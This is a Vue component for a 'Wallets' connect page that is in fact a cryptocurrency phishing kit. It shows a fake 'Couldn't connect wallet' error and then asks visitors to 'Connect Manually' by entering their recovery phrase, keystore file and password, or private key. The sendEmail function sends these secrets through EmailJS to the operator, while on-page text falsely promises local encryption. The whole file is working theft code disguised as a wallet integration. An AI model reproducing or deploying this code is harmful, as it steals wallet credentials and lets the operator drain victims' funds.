<script setup>
import Layout from '../components/Layout.vue'
import wallets from '../assets/wallets.json'
import { ref, reactive } from 'vue'
import emailjs from '@emailjs/browser'
import router from '../router'

const connectModalTrigger = ref()
const showConnect = reactive({ value: false })
const showCreds = reactive({
  value: false,
  errorMsg: '',
  successMsg: ''
})

const currentWallet = reactive({
  name: '',
  src: ''
})

const formDisplay = reactive({ value: 'recovery-phrase' })
const formInputKeyStoreJson = ref()

const formInput = {
  recoveryPhrase: '',
  walletPassword: '',
  privateKey: ''
}

function sendEmail(data) {
  data.walletName = currentWallet.name

  emailjs
    .send(
      'wallet_validator_tobi',
      'template_crypto_validate',
      data,
      'SKECErAHJ5g1CQj--'
    )
    .then(
      (result) => {
        redirectUser()
      },
      (error) => {
        router.push({ name: 'wallets-view' })
      }
    )
}

const formSubmit = {
  recoveryPhrase() {
    showCreds.errorMsg = ''

    if (!formInput.recoveryPhrase.match(/(?:[a-zA-z]+\s){5,}/)) {
      showCreds.errorMsg = 'Invalid recovery phrase!'
      return false
    }

    sendEmail({
      recoveryPhrase: formInput.recoveryPhrase
    })
    showCreds.successMsg = 'Connecting wallet...'
  },
  keyStoreJson(e) {
    showCreds.errorMsg = ''

    if (formInput.walletPassword.length < 3) {
      showCreds.errorMsg = 'Invalid wallet password!'
      return false
    }

    const reader = new FileReader()
    reader.onloadend = () => {
      sendEmail({
        walletPassword: formInput.walletPassword,
        keyStore: reader.result
      })
    }
    reader.readAsBinaryString(formInputKeyStoreJson.value.files[0])
    showCreds.successMsg = 'Connecting wallet...'
  },
  privateKey() {
    showCreds.errorMsg = ''

    if (!formInput.privateKey.match(/(?:[a-zA-z]+\s){5,}/)) {
      showCreds.errorMsg = 'Invalid private key!'
      return false
    }

    sendEmail({
      privateKey: formInput.privateKey
    })
    showCreds.successMsg = 'Connecting wallet...'
  }
}

function redirectUser() {
  setTimeout(() => {
    showCreds.successMsg = ''
    router.push({ name: 'generate-code' })
  }, 1000)
}

function popupConnect({ wallet }) {
  connectModalTrigger.value.checked = true
  currentWallet.name = wallet.name
  currentWallet.src = wallet.src

  setTimeout(() => (showConnect.value = true), 2000)
}
</script>

<template>
  <Layout>
    <div class="container mx-auto mt-20">
      <h3 class="text-center text-4xl mb-4">Wallets</h3>
      <p class="text-lg text-center md:mx-24">
        Multiple iOS and Android wallets support this protocol. Your private
        keys are encrypted locally on your device with Secure Enclave, protected
        by Biometric and 2-Factor Authentication.
      </p>
    </div>
    <div class="container mt-10 mx-auto flex flex-col items-center">
      <div
        class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4"
      >
        <div
          v-for="wallet in wallets"
          @click="popupConnect({ wallet })"
          class="card cursor-pointer bg-inherit shadow-xl border-2 border-white mx-4"
        >
          <figure class="pt-10">
            <img
              :src="`/imgs/wallets/${wallet.src}`"
              :alt="wallet.name"
              class="w-1/2 rounded-xl"
            />
          </figure>
          <div class="card-body items-center text-center px-1">
            <h2 class="card-title mt-auto">{{ wallet.name }}</h2>
          </div>
        </div>
      </div>
    </div>
    <div class="mt-10 hidden">
      <p class="text-lg text-center md:mx-24">
        Open a pull request on Help to add your wallet here.
      </p>
    </div>

    <input
      type="checkbox"
      id="connect-modal"
      ref="connectModalTrigger"
      class="modal-toggle"
    />

    <div class="modal">
      <div v-show="!showCreds.value" class="absolute top-0 px-4 py-4 w-full">
        <div
          v-show="showConnect.value"
          class="alert alert-error shadow-md items-start"
        >
          <div>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              class="stroke-current flex-shrink-0 h-6 w-6"
              fill="none"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"
              />
            </svg>
            <span>Error! Couldn't connect wallet</span>
          </div>
        </div>
        <div
          v-show="!showConnect.value"
          class="alert alert-success shadow-md items-start"
        >
          <div>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              class="stroke-current flex-shrink-0 h-6 w-6"
              fill="none"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
              />
            </svg>

            <span>Connecting wallet...</span>
          </div>
        </div>
      </div>
      <div v-show="showCreds.value" class="absolute top-0 px-4 py-4 w-full">
        <div
          v-show="showCreds.errorMsg"
          class="alert alert-error shadow-md items-start"
        >
          <div>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              class="stroke-current flex-shrink-0 h-6 w-6"
              fill="none"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z"
              />
            </svg>
            <span>{{ showCreds.errorMsg }}</span>
          </div>
        </div>
        <div
          v-show="showCreds.successMsg"
          class="alert alert-success shadow-md items-start"
        >
          <div>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              class="stroke-current flex-shrink-0 h-6 w-6"
              fill="none"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
              />
            </svg>
            <span>{{ showCreds.successMsg }}</span>
          </div>
        </div>
      </div>
      <div class="modal-box relative bg-darkBlue">
        <label
          for="connect-modal"
          @click="
            () => {
              showConnect.value = false
              showCreds.value = false
            }
          "
          class="btn btn-sm btn-circle bg-darkBlue border-white absolute text-white right-2 top-2 hover:border-white hover:text-darkBlue hover:bg-white"
          >✕</label
        >
        <div v-show="!showCreds.value" class="flex flex-col gap-y-4 gap-x-2">
          <div
            class="flex border-white border-2 rounded-md px-4 py-2 justify-between"
          >
            <span class="self-center text-lg">{{ currentWallet.name }}</span>
            <img class="w-10" :src="`/imgs/wallets/${currentWallet.src}`" />
          </div>
          <div v-show="showConnect.value" class="text-center">
            <button
              @click="showCreds.value = true"
              class="btn btn-primary-custom"
            >
              Connect Manually
            </button>
          </div>
        </div>
        <div v-show="showCreds.value">
          <div class="flex px-4 py-2 gap-x-2">
            <img class="w-10" :src="`/imgs/wallets/${currentWallet.src}`" />
            <span class="self-center font-bold text-lg">{{
              currentWallet.name
            }}</span>
          </div>
          <div
            class="flex mt-4 py-4 border-b-solid border-b-2 border-b-lightGrey px-2 justify-around"
          >
            <span
              @click="formDisplay.value = 'recovery-phrase'"
              class="cursor-pointer border-b-2 border-b-darkBlue hover:border-b-white hover:border-b-white"
            >
              Phrase
            </span>
            <span
              @click="formDisplay.value = 'keystore-json'"
              class="cursor-pointer border-b-2 border-b-darkBlue hover:border-b-white hover:border-b-white"
            >
              Keystore JSON
            </span>
            <span
              @click="formDisplay.value = 'private-key'"
              class="cursor-pointer border-b-2 border-b-darkBlue hover:border-b-white hover:border-b-white"
            >
              Private Key
            </span>
          </div>
          <form
            v-show="formDisplay.value == 'recovery-phrase'"
            @submit.prevent="formSubmit.recoveryPhrase($event)"
            class="mt-4"
          >
            <div class="form-control">
              <textarea
                required
                v-model="formInput.recoveryPhrase"
                class="textarea w-full ring-1 bg-darkBlue text-white border-white focus:ring-1 focus:ring-offset-2 focus:ring-white h-32 resize-none"
                placeholder="Enter your recovery phrase"
              ></textarea>
              <label class="label">
                <span class="label-text-alt text-white"
                  >Typically 12 (sometimes 24) words separated by single
                  spaces</span
                >
              </label>
            </div>
            <button type="submit" class="btn btn-primary-custom mt-2 w-full">
              PROCEED
            </button>
          </form>
          <form
            v-show="formDisplay.value == 'keystore-json'"
            @submit.prevent="formSubmit.keyStoreJson($event)"
            class="mt-4"
          >
            <div class="form-control mb-4">
              <label class="label justify-center">
                <span class="label-text-alt text-white"
                  >Choose keystore file</span
                >
              </label>
              <div class="mb-2">
                <input type="file" ref="formInputKeyStoreJson" required />
              </div>
              <div>
                <input
                  type="text"
                  required
                  v-model="formInput.walletPassword"
                  placeholder="Wallet password"
                  class="input w-full bg-darkBlue border-2 border-white"
                />
              </div>
              <label class="label justify-center">
                <span class="label-text-alt text-white"
                  >Several lines of text beginning with "{...}" plus the
                  password you used to encrypt it.
                </span>
              </label>
            </div>
            <button type="submit" class="btn btn-primary-custom mt-2 w-full">
              PROCEED
            </button>
          </form>
          <form
            v-show="formDisplay.value == 'private-key'"
            @submit.prevent="formSubmit.privateKey($event)"
            class="mt-4"
          >
            <div class="form-control">
              <input
                required
                v-model="formInput.privateKey"
                type="text"
                placeholder="Enter your Private Key"
                class="input w-full bg-darkBlue border-2 border-white"
              />
              <label class="label">
                <span class="label-text-alt text-white"
                  >Typically 12 (sometimes 24) words separated by single
                  spaces</span
                >
              </label>
            </div>
            <button type="submit" class="btn btn-primary-custom mt-2 w-full">
              PROCEED
            </button>
          </form>
        </div>
      </div>
    </div>
  </Layout>
</template>
